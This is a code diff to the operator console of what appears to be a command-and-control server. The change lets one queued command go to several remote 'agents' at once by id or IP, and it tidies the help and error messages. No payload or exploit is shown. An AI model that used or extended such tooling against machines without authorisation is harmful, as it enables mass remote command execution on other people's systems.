@@ -126,9 +126,9 @@ def operator_console():
         if cmd == "help":
             print("Commands:")
             print("  list                         - List active agents (shows id, ip, age)")
-            print("  info <id|ip>        - Show detailed info for an agent")
-            print("  task <id|ip> <cmd>  - Queue a command for an agent")
-            print("  results <id|ip>     - Show results from an agent")
+            print("  info <id|ip>                 - Show detailed info for an agent")
+            print("  task <cmd> <id|ip>           - Queue a command for a list of agents separated by a comma")
+            print("  results <id|ip>              - Show results from an agent")
             print("  exit                         - Stop the server")
             continue
 
@@ -162,7 +162,7 @@ def operator_console():
             identifier = parts[1] # This could be agent id or ip
             agent_id = find_agent_by_identifier(identifier)
             if not agent_id:
-                print("No such agent.")
+                print(f"No such agent for {identifier}.")
                 continue
             with lock:
                 info = AGENT_INFO.get(agent_id, {})
@@ -176,20 +176,22 @@ def operator_console():
 
         if cmd == "task":   # working on this
             if len(parts) < 3:
-                print("Usage: task <agent_id|ip> <command>")
+                print("Usage: task <command> <agent_id|ip>")
                 continue
-            identifier = parts[1]
-            agent_id = find_agent_by_identifier(identifier)
-            command_text = parts[2]
-            if not agent_id:
-                print("No such agent (or stale).")
-                continue
-            with lock:
-                # optional staleness check
-                COMMANDS.setdefault(agent_id, []).append(command_text)
-                # report back which agent id and ip got the task
-                ip = AGENT_INFO.get(agent_id, {}).get("ip")
-                print(f"\n[+] Queued command for id={identifier} ip={ip}: {command_text}")
+            identifiers = parts[2].split(",") # list of ids or ips to queue the command for.
+            print("list of identifiers:" + str(identifiers))
+            for identifier in identifiers:
+                agent_id = find_agent_by_identifier(identifier)
+                command_text = parts[1]
+                if not agent_id:
+                    print(f"No such agent (or stale) for {identifier}")
+                    continue
+                with lock:
+                    # optional staleness check
+                    COMMANDS.setdefault(agent_id, []).append(command_text)
+                    # report back which agent id and ip got the task
+                    ip = AGENT_INFO.get(agent_id, {}).get("ip")
+                    print(f"\n[+] Queued command for id={agent_id} ip={ip}: {command_text}")
             continue
 
         if cmd == "results":
